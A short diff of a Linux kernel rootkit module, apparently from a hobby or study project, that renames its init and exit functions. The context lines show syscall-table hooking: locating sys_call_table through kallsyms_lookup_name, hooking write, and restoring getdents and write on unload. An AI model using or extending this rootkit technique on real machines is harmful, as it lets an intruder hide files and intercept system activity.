@@ -80,7 +80,7 @@ asmlinkage void sys_write_do_hook(unsigned int fd, const char __user* buf, size_
 }
 
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
-int __init hooks(void){
+int __init hooks_init(void){
 	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
 		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
 		return -1;
@@ -101,7 +101,7 @@ int __init hooks(void){
 }
 
 
-void __exit unhooks(void){
+void __exit hooks_exit(void){
 	ENABLE_WRITE();
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
 	if (HOOK_WRITE) syscall_table[__NR_write] = sys_write_orig;
